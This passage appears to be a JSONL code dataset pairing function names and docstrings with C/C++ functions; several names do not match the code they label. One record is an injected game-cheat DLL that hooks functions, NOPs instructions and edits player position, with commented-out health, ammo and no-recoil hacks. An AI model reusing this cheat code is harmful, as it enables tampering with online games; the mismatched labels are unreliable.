rgDistance[rgResult[i].iStartPoint][rgResult[i].iEndPoint];\\r\\n\\t}\\r\\n\\r\\n\\treturn bRet;\\r\\n}'}","id":4228}
{"content":"{'function_name': 'ListInsert', 'docstring': '\/\/ Get index of free element', 'code': 'Status ListDelete(StaticLinkList L, int i)\\n{\\n\\tint j, k;\\n\\tif (i < 0 || i > ListLength(L)-1)\\n\\t\\treturn ERROR;\\n\\tk = MAXSIZE - 1;\\n\\t\/\/ Find the element,who is in front of the ith element\\n\\tfor (j = 0; j < i; j++)\\n\\t\\tk = L[k].cur;\\n\\t\/\/ q = p->next\\n\\tj = L[k].cur;\\n\\t\/\/ p->next = q->next\\n\\tL[k].cur = L[j].cur;\\n\\tFree_SSL(L, j);\\n\\treturn OK;\\n}'}","id":4232}
{"content":"{'function_name': 'tokenize', 'docstring': '\/\/split on spaces', 'code': 'std::vector<Command> getCommands(const std::vector<std::string>& tokens) {\\n    std::vector<Command> ret(std::count(tokens.begin(), tokens.end(), \"|\") + 1);  \/\/1 + num |\\'s comman\\n    \\n    \\n    \\n    int first = 0;\\n    int fd0 = 0;\\n    int fd1 = 0;\\n    int pipeFD[2];\\n    \\n    int last = std::find(tokens.begin(), tokens.end(), \"|\") - tokens.begin();\\n    bool error = false;\\n    for(int i = 0; i < ret.size(); ++i) {\\n        if((tokens[first] == \"&\") || (tokens[first] == \"<\") ||\\n           (tokens[first] == \">\") || (tokens[first] == \"|\")){\\n            error = true;\\n            break;\\n        }\\n        \\n        ret[i].exec = tokens[first];\\n        ret[i].argv.push_back(tokens[first].c_str()); \/\/argv0 = program name\\n        std::cout << \"exec start: \" << ret[i].exec << std::endl;\\n        ret[i].fdStdin = 0;\\n        ret[i].fdStdout = 1;\\n        ret[i].background = false;\\n        \\n        for(int j = first + 1; j < last; ++j) {\\n            if(tokens[j] == \">\" || tokens[j] == \"<\" ){\\n                \\n                if (tokens[j] == \">\") {\\n                    \/\/std::cout << \"TOKENNNNN \" << tokens[j] << std::endl;\\n                    fd1 = open(tokens[j + 1].c_str(), O_RDWR|O_CREAT, 0666);\\n                    if (fd1 == -1) {\\n                        perror(\"open error\");\\n                        \/\/exit(1);\\n                    }\\n                    ret[i].argv.push_back(nullptr);\\n                    ret[i].fdStdout = fd1;\\n                }\\n\\n                else if (tokens[j] == \"<\") {\\n                    fd0 = open(tokens[j + 1].c_str(), O_RDONLY);\\n                    std::cout << \"FD0\\\\n\";\\n                    if (fd0 == -1) {\\n                        perror(\"open\");\\n                        \/\/exit(1);\\n                    }\\n                    ret[i].fdStdin = fd0;\\n                }\\n                \\n                \\n            } else if(tokens[j] == \"&\") {\\n                \/\/Fill this in if you choose to do the optional \"background command\" part\\n                assert(false);\\n            } else {\\n                \/\/otherwise this is a normal command line argument!\\n                ret[i].argv.push_back(tokens[j].c_str());\\n            }\\n            \\n        }\\n        if(i > 0) {\\n            \/* there are multiple commands.  Open open a pipe and\\n             Connect the ends to the fds for the commands!\\n             *\/\\n            fd1 = pipe(pipeFD);\\n            if (fd1 == -1) {\\n                perror(\"pipe failed\");\\n                exit(1);\\n            }\\n            ret[i - 1].fdStdout = pipeFD[1]; \/\/0 read end , 1 is the write end\\n            ret[i].fdStdin = pipeFD[0];\\n            std::cout << \"FD-OUT \" << ret[i-1].fdStdout << std::endl;\\n            std::cout << \"FD-IN \" << ret[i].fdStdin << std::endl;\\n        }\\n        \/\/exec wants argv to have a nullptr at the end!\\n        ret[i].argv.push_back(nullptr);\\n        \\n        \/\/find the next pipe character\\n        first = last + 1;\\n        if(first < tokens.size()) {\\n            last = std::find(tokens.begin() + first, tokens.end(), \"|\") - tokens.begin();\\n        }\\n    }\\n    \\n    if(error) {\\n        \/\/close any file descriptors you opened in this function!\\n        close(fd0);\\n        close(fd1);\\n        close(pipeFD[0]);\\n        close(pipeFD[1]);\\n    }\\n    return ret;\\n}'}","id":4233}
{"content":"{'function_name': 'guest_mmap', 'docstring': '\/\/ For PROT_EXEC request we translate it into PROT_READ, as we need to interpret it.', 'code': 'int guest_mprotect(reg_t address, reg_t size, int prot) {\\n\\n    \/\/ Translate protection flags.\\n    if (prot & PROT_EXEC) {\\n        prot &=~ PROT_EXEC;\\n        prot |= PROT_READ;\\n    }\\n\\n    return mprotect(translate_address(address), size, prot);\\n}'}","id":4245}
{"content":"{'function_name': 'HookFunc', 'docstring': '\/*DWORD relativeAddress = ((DWORD)ourFunc - (DWORD) toHook);\\n\\n\\t*(BYTE*)toHook = 0xE9;\\n\\t*(DWORD*)((DWORD)toHook + 1) = relativeAddress;\\n\\t*\/', 'code': 'DWORD WINAPI HackThread(HMODULE hModule)\\n{\\n\\t\/\/Create Console\\n\\tAllocConsole();\\n\\tFILE* f;\\n\\tfreopen_s(&f, \"CONOUT$\", \"w\", stdout);\\n\\n\\tstd::cout << \"aMazeIng Hax initialized\\\\n\";\\n\\n\\tuintptr_t moduleBase = (uintptr_t)GetModuleHandle(L\"GameAssembly.dll\");\\n\\tstd::cout << \"Base: \" << moduleBase << std::endl;\\n\\tuintptr_t uPlayer = (uintptr_t)GetModuleHandle(L\"UnityPlayer.dll\");\\n\\tstd::cout << \"Unity Player: \" << uPlayer << std::endl;\\n\\t\/\/calling it with NULL also gives you the address of the .exe module\\n\\t\/\/moduleBase = (uintptr_t)GetModuleHandle(NULL);\\n\\n\\n\\tuintptr_t sendEmojiHookAddress = moduleBase + 0x6d572f;\\n\\tstd::cout << \"Emoji Send Address: \" << sendEmojiHookAddress << std::endl;\\n\\tint sendEmojiHookL = 5;\\n\\tsendEmojiBackAddress = sendEmojiHookAddress + sendEmojiHookL;\\n\\n\\tHookFunc((void*)sendEmojiHookAddress, EmojiHook, sendEmojiHookL);\\n\\n\\n\\tbool bManual = false;\\n\\n\\tBYTE xrestore[6] = { 0 };\\n\\tBYTE yrestore[6] = { 0 };\\n\\tBYTE zrestore[6] = { 0 };\\n\\tvec3* position = nullptr;\\n\\n\\twhile (true)\\n\\t{\\n\\t\\tif (GetAsyncKeyState(VK_NUMPAD7) & 1)\\n\\t\\t{\\n\\t\\t\\tif (bManual){\\n\\t\\t\\t\\t\/\/50 8D 4C 24 1C 51 8B CE FF D2 the original stack setup and call\\n\\t\\t\\t\\tmem::Patch((BYTE*)(uPlayer + 0x1155914), xrestore, 6);\\n\\t\\t\\t\\tmem::Patch((BYTE*)(uPlayer + 0x115591D), yrestore, 6);\\n\\t\\t\\t\\tmem::Patch((BYTE*)(uPlayer + 0x1155926), zrestore, 6);\\n\\t\\t\\t}\\n\\t\\t\\tbreak;\\n\\t\\t}\\n\\n\\t\\tif (GetAsyncKeyState(\\'I\\') & 1)\\n\\t\\t{\\n\\t\\t\\tsendEmojiValue = sendEmojiValue + 1;\\n\\t\\t\\tstd::cout << \"Current emoji value: \" << sendEmojiValue << std::endl;\\n\\t\\t}\\n\\t\\tif (GetAsyncKeyState(\\'K\\') & 1)\\n\\t\\t{\\n\\t\\t\\tsendEmojiValue = sendEmojiValue - 1;\\n\\t\\t\\tstd::cout << \"Current emoji value: \" << sendEmojiValue << std::endl;\\n\\n\\t\\t}\\n\\n\\n\\t\\tif (GetAsyncKeyState(VK_NUMPAD1) & 1) {\\n\\t\\t\\tbManual = !bManual;\\n\\t\\t\\tstd::cout << \"[*] \" << ((bManual == 1) ? \"Enabled\" : \"Disabled\");\\n\\t\\t\\t\\n\\t\\t\\tif (bManual)\\n\\t\\t\\t{\\n\\t\\t\\t\\tposition = (vec3*)mem::FindDMAAddy(moduleBase + 0x00AFA430, { 0x110, 0x788, 0x130, 0x28, 0x150 });\\n\\n\\t\\t\\t\\t\/\/x 0x1155914\\n\\t\\t\\t\\t\/\/y 0x115591D\\n\\t\\t\\t\\t\/\/y 0x1155926\\n\\n\\t\\t\\t\\t\\n\\t\\t\\t\\tmem::Patch(xrestore, (BYTE *)(uPlayer + 0x1155914), 6);\\n\\t\\t\\t\\tmem::Nop((BYTE*)(uPlayer + 0x1155914), 6);\\n\\n\\t\\t\\t\\tstd::cout << \"y instr addr \" << std::hex << static_cast<int>(uPlayer + 0x1155914);\\n\\n\\t\\t\\t\\tstd::cout << \" y instr \";\\n\\t\\t\\t\\tfor (auto val : xrestore) printf(\"\\\\\\\\x%.2x\", val);\\n\\t\\t\\t\\tstd::cout << std::endl;\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t   \\n\\n\\t\\t\\t\\tmem::Patch(yrestore, (BYTE *)(uPlayer+0x115591D), 6);\\n\\t\\t\\t\\tmem::Nop((BYTE*)(uPlayer + 0x115591D), 6);\\n\\n\\t\\t\\t\\tstd::cout << \"y instr addr \" << std::hex << static_cast<int>(uPlayer + 0x115591D);\\n\\n\\t\\t\\t\\tstd::cout << \" y instr \";\\n\\t\\t\\t\\tfor (auto val : yrestore) printf(\"\\\\\\\\x%.2x\", val);\\n\\t\\t\\t\\tstd::cout << std::endl;\\n\\t\\t\\t\\t\\n\\n\\t\\t\\t\\tmem::Patch(zrestore, (BYTE *)(uPlayer + 0x1155926), 6);\\n\\t\\t\\t\\tmem::Nop((BYTE*)(uPlayer + 0x1155926), 6);\\n\\t\\t\\t\\tstd::cout << \"y instr addr \" << std::hex << static_cast<int>(uPlayer + 0x1155926);\\n\\t\\t\\t\\t\\n\\t\\t\\t\\tstd::cout << \" y instr \";\\n\\t\\t\\t\\tfor (auto val : zrestore) printf(\"\\\\\\\\x%.2x\", val);\\n\\t\\t\\t\\tstd::cout << std::endl;\\n\\n\\t\\t\\t\\t\\n\\t\\t\\t}\\n\\n\\t\\t\\telse\\n\\t\\t\\t{\\n\\t\\t\\t\\t\/\/50 8D 4C 24 1C 51 8B CE FF D2 the original stack setup and call\\n\\t\\t\\t\\tmem::Patch((BYTE*)(uPlayer + 0x1155914), xrestore, 6);\\n\\t\\t\\t\\tmem::Patch((BYTE*)(uPlayer + 0x115591D), yrestore, 6);\\n\\t\\t\\t\\tmem::Patch((BYTE*)(uPlayer + 0x1155926), zrestore, 6);\\n\\n\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\tif (bManual)\\n\\t\\t{\\n\\t\\t\\tstd::cout << \"X: \" << (int)position->x << \" Y:\" << (int)position->y << \" Z:\" << (int)position->z << std::endl;\\n\\n\\t\\t\\tif (GetAsyncKeyState(VK_NUMPAD9) & 1)\\n\\t\\t\\t{\\n\\t\\t\\t\\tposition->y += 1;\\n\\t\\t\\t}\\n\\t\\t\\tif (GetAsyncKeyState(VK_NUMPAD3) & 1)\\n\\t\\t\\t{\\n\\t\\t\\t\\tposition->y -= 1;\\n\\t\\t\\t}\\n\\t\\t\\tif (GetAsyncKeyState(VK_NUMPAD6) & 1)\\n\\t\\t\\t{\\n\\t\\t\\t\\tposition->x += 1;\\n\\t\\t\\t}\\n\\t\\t\\tif (GetAsyncKeyState(VK_NUMPAD4) & 1)\\n\\t\\t\\t{\\n\\t\\t\\t\\tposition->x -= 1;\\n\\t\\t\\t}\\n\\t\\t\\tif (GetAsyncKeyState(VK_NUMPAD8) & 1)\\n\\t\\t\\t{\\n\\t\\t\\t\\tposition->z += 1;\\n\\t\\t\\t}\\n\\t\\t\\tif (GetAsyncKeyState(VK_NUMPAD2) & 1)\\n\\t\\t\\t{\\n\\t\\t\\t\\tposition->z -= 1;\\n\\t\\t\\t}\\n\\t\\t\\tstd::cout << \"X: \" << (int)position->x << \" Y:\" << (int)position->y << \" Z:\" << (int)position->z << std::endl;\\n\\t\\t}\\n\\t\\t\/*\\n\\t\\t\/\/no recoil NOP\\n\\t\\tif (GetAsyncKeyState(VK_NUMPAD3) & 1)\\n\\t\\t{\\n\\t\\t\\tbRecoil = !bRecoil;\\n\\n\\t\\t\\tif (bRecoil)\\n\\t\\t\\t{\\n\\t\\t\\t\\tmem::Nop((BYTE*)(moduleBase + 0x63786), 10);\\n\\t\\t\\t}\\n\\n\\t\\t\\telse\\n\\t\\t\\t{\\n\\t\\t\\t\\t\/\/50 8D 4C 24 1C 51 8B CE FF D2 the original stack setup and call\\n\\t\\t\\t\\tmem::Patch((BYTE*)(moduleBase + 0x63786), (BYTE*)\"\\\\x50\\\\x8D\\\\x4C\\\\x24\\\\x1C\\\\x51\\\\x8B\\\\xCE\\\\xFF\\\\xD2\", 10);\\n\\t\\t\\t}\\n\\t\\t}\\n\\n\\t\\t\/\/need to use uintptr_t for pointer arithmetic later\\n\\t\\tuintptr_t* localPlayerPtr = (uintptr_t*)(moduleBase + 0x10F4F4);\\n\\n\\t\\t\/\/continuous writes \/ freeze\\n\\n\\t\\tif (localPlayerPtr)\\n\\t\\t{\\n\\t\\t\\tif (bHealth)\\n\\t\\t\\t{\\n\\n\\t\\t\\t\\t\/\/*localPlayerPtr = derference the pointer, to get the localPlayerAddr\\n\\t\\t\\t\\t\/\/ add 0xF8 to get health address\\n\\t\\t\\t\\t\/\/cast to an int pointer, this pointer now points to the health address\\n\\t\\t\\t\\t\/\/derference it and assign the value 1337 to the health variable it points to\\n\\t\\t\\t\\t*(int*)(*localPlayerPtr + 0xF8) = 1337;\\n\\t\\t\\t}\\n\\n\\t\\t\\tif (bAmmo)\\n\\t\\t\\t{\\n\\t\\t\\t\\t\/\/We aren\\'t external now, we can now efficiently calculate all pointers dynamically\\n\\t\\t\\t\\t\/\/before we only resolved pointers when needed for efficiency reasons\\n\\t\\t\\t\\t\/\/we are executing internally, we can calculate everything when needed\\n\\t\\t\\t\\tuintptr_t ammoAddr = mem::FindDMAAddy(moduleBase + 0x10F4F4, { 0x374, 0x14, 0x0 });\\n\\t\\t\\t\\tint* ammo = (int*)ammoAddr;\\n\\t\\t\\t\\t*ammo = 1337;\\n\\n\\t\\t\\t\\t\/\/or just\\n\\t\\t\\t\\t*(int*)mem::FindDMAAddy(moduleBase + 0x10F4F4, { 0x374, 0x14, 0x0 }) = 1337;\\n\\t\\t\\t}\\n\\n\\t\\t}*\/\\n\\t\\tSleep(5);\\n\\t}\\n\\n\\tfclose(f);\\n\\tFreeConsole();\\n\\tFreeLibraryAndExitThread(hModule, 0);\\n\\treturn 0;\\n}'}","id":4251}
{"content":"{'function_name': 'MimeOleVariantFree', 'docstring': '\/\/ Done\\r', 'code': 'MIMEOLEAPI MimeOleVariantCopy(LPPROPVARIANT pDest, LPPROPVARIANT pSource)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT     hr=S_OK;\\r\\n    ULONG       cb;\\r\\n\\r\\n    \/\/ Invalid Arg\\r\\n    Assert(pSource && pDest);\\r\\n\\r\\n    \/\/ Handle Variant Type...\\r\\n    switch(pSource->vt)\\r\\n    {\\r\\n    case VT_UI1:\\r\\n        pDest->bVal = pSource->bVal;\\r\\n        break;\\r\\n\\r\\n    case VT_I2:\\r\\n        pDest->iVal= pSource->iVal;\\r\\n        break;\\r\\n\\r\\n    case VT_UI2:\\r\\n        pDest->uiVal = pSource->uiVal;\\r\\n        break;\\r\\n\\r\\n    case VT_I4:\\r\\n        pDest->lVal = pSource->lVal;\\r\\n        break;\\r\\n\\r\\n    case VT_UI4:\\r\\n        pDest->ulVal = pSource->ulVal;\\r\\n        break;\\r\\n\\r\\n    case VT_I8:\\r\\n        pDest->hVal.QuadPart = pSource->hVal.QuadPart;\\r\\n        break;\\r\\n\\r\\n    case VT_UI8:\\r\\n        pDest->uhVal.QuadPart = pSource->uhVal.QuadPart;\\r\\n        break;\\r\\n\\r\\n    case VT_R4:\\r\\n        pDest->fltVal = pSource->fltVal;\\r\\n        break;\\r\\n\\r\\n    case VT_R8:\\r\\n        pDest->dblVal = pSource->dblVal;\\r\\n        break;\\r\\n\\r\\n    case VT_CY:\\r\\n        CopyMemory(&pDest->cyVal, &pSource->cyVal, sizeof(CY));\\r\\n        break;\\r\\n\\r\\n    case VT_DATE:\\r\\n        pDest->date = pSource->date;\\r\\n        break;\\r\\n\\r\\n    case VT_BOOL:\\r\\n        pDest->boolVal = pSource->boolVal;\\r\\n        break;\\r\\n\\r\\n    case VT_ERROR:\\r\\n        pDest->scode = pSource->scode;\\r\\n        break;\\r\\n\\r\\n    case VT_FILETIME:\\r\\n        CopyMemory(&pDest->filetime, &pSource->filetime, sizeof(FILETIME));\\r\\n        break;\\r\\n\\r\\n    case VT_CF:\\r\\n        \/\/ Invalid Arg\\r\\n        if (NULL == pSource->pclipdata)\\r\\n            return TrapError(E_INVALIDARG);\\r\\n\\r\\n        \/\/ Duplicate the clipboard format\\r\\n        CHECKALLOC(pDest->pclipdata = (CLIPDATA *)g_pMalloc->Alloc(sizeof(CLIPDATA)));\\r\\n\\r\\n        \/\/ Copy the data\\r\\n        CopyMemory(pDest->pclipdata, pSource->pclipdata, sizeof(CLIPDATA));\\r\\n        break;\\r\\n\\r\\n    case VT_CLSID:\\r\\n        \/\/ Invalid Arg\\r\\n        if (NULL == pDest->puuid)\\r\\n            return TrapError(E_INVALIDARG);\\r\\n\\r\\n        \/\/ Duplicate the CLSID\\r\\n        CHECKALLOC(pDest->puuid = (CLSID *)g_pMalloc->Alloc(sizeof(CLSID)));\\r\\n\\r\\n        \/\/ Copy\\r\\n        CopyMemory(pDest->puuid, pSource->puuid, sizeof(CLSID));\\r\\n        break;\\r\\n\\r\\n    case VT_LPWSTR:\\r\\n        \/\/ Invalid Arg\\r\\n        if (NULL == pSource->pwszVal)\\r\\n            return TrapError(E_INVALIDARG);\\r\\n\\r\\n        \/\/ Get Size\\r\\n        cb = (lstrlenW(pSource->pwszVal) + 1) * sizeof(WCHAR);\\r\\n\\r\\n        \/\/ Dup the unicode String\\r\\n        CHECKALLOC(pDest->pwszVal = (LPWSTR)g_pMalloc->Alloc(cb));\\r\\n\\r\\n        \/\/ Copy the data\\r\\n        CopyMemory(pDest->pwszVal, pSource->pwszVal, cb);\\r\\n        break;\\r\\n\\r\\n    case VT_LPSTR:\\r\\n        \/\/ Invalid Arg\\r\\n        if (NULL == pSource->pszVal)\\r\\n            return TrapError(E_INVALIDARG);\\r\\n\\r\\n        \/\/ Get Size\\r\\n        cb = lstrlen(pSource->pszVal) + 1;\\r\\n\\r\\n        \/\/ Dup the unicode String\\r\\n        CHECKALLOC(pDest->pszVal = (LPSTR)g_pMalloc->Alloc(cb));\\r\\n\\r\\n        \/\/ Copy the data\\r\\n        CopyMemory(pDest->pszVal, pSource->pszVal, cb);\\r\\n        break;\\r\\n\\r\\n    case VT_BLOB:\\r\\n        \/\/ Invalid Arg\\r\\n        if (NULL == pSource->blob.pBlobData)\\r\\n            return TrapError(E_INVALIDARG);\\r\\n\\r\\n        \/\/ Duplicate the blob\\r\\n        CHECKALLOC(pDest->blob.pBlobData = (LPBYTE)g_pMalloc->Alloc(pSource->blob.cbSize));\\r\\n\\r\\n        \/\/ Copy the data\\r\\n        CopyMemory(pDest->blob.pBlobData, pSource->blob.pBlobData, pSource->blob.cbSize);\\r\\n        break;\\r\\n\\r\\n    case VT_STREAM:\\r\\n        \/\/ Invalid Arg\\r\\n        if (NULL == pSource->pStream)\\r\\n            return TrapError(E_INVALIDARG);\\r\\n\\r\\n        \/\/ Assume the new stream\\r\\n        pDest->pStream = pSource->pStream;\\r\\n        pDest->pStream->AddRef();\\r\\n        break;\\r\\n\\r\\n    case VT_STORAGE:\\r\\n        \/\/ Invalid Arg\\r\\n        if (NULL == pSource->pStorage)\\r\\n            return TrapError(E_INVALIDARG);\\r\\n\\r\\n        \/\/ Assume the new storage\\r\\n        pDest->pStorage = pSource->pStorage;\\r\\n        pDest->pStorage->AddRef();\\r\\n        break;\\r\\n\\r\\n    default:\\r\\n        Assert(FALSE);\\r\\n        hr = TrapError(E_INVALIDARG);\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ Success, return vt\\r\\n    pDest->vt = pSource->vt;\\r\\n\\r\\nexit:\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":4254}
{"content":"{'function_name': 'p_GeoDaWeight__SaveToFile', 'docstring': '\/\/ grab the object as a XPtr (smart pointer) to GeoDaWeight', 'code': 'NumericVector p_GeoDaWeight__GetNeighbors(SEXP xp, int obs_idx)\\n{\\n  \/\/ grab the object as a XPtr (smart pointer) to GeoDaWeight\\n  Rcpp::XPtr<GeoDaWeight> ptr(xp);\\n\\n  \/\/ invoke the function\\n  std::vector<long> nn = ptr->GetNeighbors(obs_idx);\\n\\n  \/\/ convert to Rcpp::StringVector\\n  NumericVector nv_nn(nn.size());\\n\\n  for (int i=0; i<nn.size(); ++i) {\\n    nv_nn[i] = nn[i];\\n  }\\n\\n  return nv_nn;\\n}'}","id":4255}
{"content":"{'function_name': 'UpdateRegisterArgumentSizes', 'docstring': '\/\/ so we can copy the whole value.\\r', 'code': 'ReturnAction_t HandleDetour(HookType_t hookType, CHook* pDetour)\\r\\n{\\r\\n\\t\/\/ Can\\'t call into SourcePawn offthread.\\r\\n\\tif (g_MainThreadId != std::this_thread::get_id())\\r\\n\\t\\treturn ReturnAction_Ignored;\\r\\n\\r\\n\\tDetourMap *map;\\r\\n\\tif (hookType == HOOKTYPE_PRE)\\r\\n\\t\\tmap = &g_pPreDetours;\\r\\n\\telse\\r\\n\\t\\tmap = &g_pPostDetours;\\r\\n\\r\\n\\t\/\/ Find the callback list for this detour.\\r\\n\\tDetourMap::Result r = map->find(pDetour);\\r\\n\\tif (!r.found())\\r\\n\\t\\treturn ReturnAction_Ignored;\\r\\n\\r\\n\\t\/\/ List of all callbacks.\\r\\n\\tPluginCallbackList *wrappers = r->value;\\r\\n\\r\\n\\tHookReturnStruct *returnStruct = NULL;\\r\\n\\tHandle_t rHndl = BAD_HANDLE;\\r\\n\\r\\n\\tHookParamsStruct *paramStruct = NULL;\\r\\n\\tHandle_t pHndl = BAD_HANDLE;\\r\\n\\r\\n\\tint argNum = pDetour->m_pCallingConvention->m_vecArgTypes.size();\\r\\n\\t\/\/ Keep a copy of the last return value if some plugin wants to override or supercede the function.\\r\\n\\tReturnAction_t finalRet = ReturnAction_Ignored;\\r\\n\\tstd::unique_ptr<uint8_t[]> finalRetBuf = std::make_unique<uint8_t[]>(pDetour->m_pCallingConvention->m_returnType.size);\\r\\n\\r\\n\\t\/\/ Call all the plugin functions..\\r\\n\\tfor (size_t i = 0; i < wrappers->size(); i++)\\r\\n\\t{\\r\\n\\t\\tCDynamicHooksSourcePawn *pWrapper = wrappers->at(i);\\r\\n\\t\\tIPluginFunction *pCallback = pWrapper->plugin_callback;\\r\\n\\r\\n\\t\\t\/\/ Create a seperate buffer for changed return values for this plugin.\\r\\n\\t\\t\/\/ We update the finalRet above if the tempRet is higher than the previous ones in the callback list.\\r\\n\\t\\tReturnAction_t tempRet = ReturnAction_Ignored;\\r\\n\\t\\tuint8_t *tempRetBuf = nullptr;\\r\\n\\r\\n\\t\\t\/\/ Find the this pointer for thiscalls.\\r\\n\\t\\t\/\/ Don\\'t even try to load it if the plugin doesn\\'t care and set it to be ignored.\\r\\n\\t\\tif (pWrapper->callConv == CallConv_THISCALL && pWrapper->thisType != ThisPointer_Ignore)\\r\\n\\t\\t{\\r\\n\\t\\t\\t\/\/ The this pointer is implicitly always the first argument.\\r\\n\\t\\t\\tvoid *thisPtr = pDetour->GetArgument<void *>(0);\\r\\n\\t\\t\\tcell_t thisAddr = GetThisPtr(thisPtr, pWrapper->thisType);\\r\\n\\t\\t\\tpCallback->PushCell(thisAddr);\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\t\/\/ Create the structure for plugins to change\/get the return value if the function returns something.\\r\\n\\t\\tif (pWrapper->returnType != ReturnType_Void)\\r\\n\\t\\t{\\r\\n\\t\\t\\t\/\/ Create a handle for the return value to pass to the plugin callback.\\r\\n\\t\\t\\treturnStruct = pWrapper->GetReturnStruct();\\r\\n\\t\\t\\tHandleError err;\\r\\n\\t\\t\\trHndl = handlesys->CreateHandle(g_HookReturnHandle, returnStruct, pCallback->GetParentRuntime()->GetDefaultContext()->GetIdentity(), myself->GetIdentity(), &err);\\r\\n\\t\\t\\tif (!rHndl)\\r\\n\\t\\t\\t{\\r\\n\\t\\t\\t\\tpCallback->Cancel();\\r\\n\\t\\t\\t\\tpCallback->GetParentRuntime()->GetDefaultContext()->BlamePluginError(pCallback, \"Error creating ReturnHandle in preparation to call hook callback. (error %d)\", err);\\r\\n\\r\\n\\t\\t\\t\\tif (returnStruct)\\r\\n\\t\\t\\t\\t\\tdelete returnStruct;\\r\\n\\r\\n\\t\\t\\t\\t\/\/ Don\\'t call more callbacks. They will probably fail too.\\r\\n\\t\\t\\t\\tbreak;\\r\\n\\t\\t\\t}\\r\\n\\t\\t\\tpCallback->PushCell(rHndl);\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\t\/\/ Create the structure for plugins to access the function arguments if it has some.\\r\\n\\t\\tif (argNum > 0)\\r\\n\\t\\t{\\r\\n\\t\\t\\tparamStruct = pWrapper->GetParamStruct();\\r\\n\\t\\t\\tHandleError err;\\r\\n\\t\\t\\tpHndl = handlesys->CreateHandle(g_HookParamsHandle, paramStruct, pCallback->GetParentRuntime()->GetDefaultContext()->GetIdentity(), myself->GetIdentity(), &err);\\r\\n\\t\\t\\tif (!pHndl)\\r\\n\\t\\t\\t{\\r\\n\\t\\t\\t\\tpCallback->Cancel();\\r\\n\\t\\t\\t\\tpCallback->GetParentRuntime()->GetDefaultContext()->BlamePluginError(pCallback, \"Error creating ThisHandle in preparation to call hook callback. (error %d)\", err);\\r\\n\\r\\n\\t\\t\\t\\t\/\/ Don\\'t leak our own handles here! Free the return struct if we fail during the argument marshalling.\\r\\n\\t\\t\\t\\tif (rHndl)\\r\\n\\t\\t\\t\\t{\\r\\n\\t\\t\\t\\t\\tHandleSecurity sec(pCallback->GetParentRuntime()->GetDefaultContext()->GetIdentity(), myself->GetIdentity());\\r\\n\\t\\t\\t\\t\\thandlesys->FreeHandle(rHndl, &sec);\\r\\n\\t\\t\\t\\t\\trHndl = BAD_HANDLE;\\r\\n\\t\\t\\t\\t}\\r\\n\\r\\n\\t\\t\\t\\tif (paramStruct)\\r\\n\\t\\t\\t\\t\\tdelete paramStruct;\\r\\n\\r\\n\\t\\t\\t\\t\/\/ Don\\'t call more callbacks. They will probably fail too.\\r\\n\\t\\t\\t\\tbreak;\\r\\n\\t\\t\\t}\\r\\n\\t\\t\\tpCallback->PushCell(pHndl);\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\t\/\/ Run the plugin callback.\\r\\n\\t\\tcell_t result = (cell_t)MRES_Ignored;\\r\\n\\t\\tpCallback->Execute(&result);\\r\\n\\r\\n\\t\\tswitch ((MRESReturn)result)\\r\\n\\t\\t{\\r\\n\\t\\tcase MRES_Handled:\\r\\n\\t\\t\\ttempRet = ReturnAction_Handled;\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\tcase MRES_ChangedHandled:\\r\\n\\t\\t\\ttempRet = ReturnAction_Handled;\\r\\n\\t\\t\\t\/\/ Copy the changed parameter values from the plugin\\'s parameter structure back into the actual detour arguments.\\r\\n\\t\\t\\tpWrapper->UpdateParamsFromStruct(paramStruct);\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\tcase MRES_ChangedOverride:\\r\\n\\t\\tcase MRES_Override:\\r\\n\\t\\tcase MRES_Supercede:\\r\\n\\t\\t\\t\/\/ See if this function returns something we should override.\\r\\n\\t\\t\\tif (pWrapper->returnType != ReturnType_Void)\\r\\n\\t\\t\\t{\\r\\n\\t\\t\\t\\t\/\/ Make sure the plugin provided a new return value. Could be an oversight if MRES_ChangedOverride \\r\\n\\t\\t\\t\\t\/\/ is called without the return value actually being changed.\\r\\n\\t\\t\\t\\tif (!returnStruct->isChanged)\\r\\n\\t\\t\\t\\t{\\r\\n\\t\\t\\t\\t\\t\/\/Throw an error if no override was set\\r\\n\\t\\t\\t\\t\\ttempRet = ReturnAction_Ignored;\\r\\n\\t\\t\\t\\t\\tpCallback->GetParentRuntime()->GetDefaultContext()->BlamePluginError(pCallback, \"Tried to override return value without return value being set\");\\r\\n\\t\\t\\t\\t\\tbreak;\\r\\n\\t\\t\\t\\t}\\r\\n\\r\\n\\t\\t\\t\\tif (pWrapper->returnType == ReturnType_String || pWrapper->returnType == ReturnType_Int || pWrapper->returnType == ReturnType_Bool)\\r\\n\\t\\t\\t\\t{\\r\\n\\t\\t\\t\\t\\ttempRetBuf = *(uint8_t **)returnStruct->newResult;\\r\\n\\t\\t\\t\\t}\\r\\n\\t\\t\\t\\telse if (pWrapper->returnType == ReturnType_Float)\\r\\n\\t\\t\\t\\t{\\r\\n\\t\\t\\t\\t\\t*(float *)&tempRetBuf = *(float *)returnStruct->newResult;\\r\\n\\t\\t\\t\\t}\\r\\n\\t\\t\\t\\telse\\r\\n\\t\\t\\t\\t{\\r\\n\\t\\t\\t\\t\\ttempRetBuf = (uint8_t *)returnStruct->newResult;\\r\\n\\t\\t\\t\\t}\\r\\n\\t\\t\\t}\\r\\n\\r\\n\\t\\t\\t\/\/ Store if the plugin wants the original function to be called.\\r\\n\\t\\t\\tif (result == MRES_Supercede)\\r\\n\\t\\t\\t\\ttempRet = ReturnAction_Supercede;\\r\\n\\t\\t\\telse\\r\\n\\t\\t\\t\\ttempRet = ReturnAction_Override;\\r\\n\\r\\n\\t\\t\\t\/\/ Copy the changed parameter values from the plugin\\'s parameter structure back into the actual detour arguments.\\r\\n\\t\\t\\tif (result == MRES_ChangedOverride)\\r\\n\\t\\t\\t\\tpWrapper->UpdateParamsFromStruct(paramStruct);\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\tdefault:\\r\\n\\t\\t\\ttempRet = ReturnAction_Ignored;\\r\\n\\t\\t\\tbreak;\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\t\/\/ Prioritize the actions. \\r\\n\\t\\tif (finalRet <= 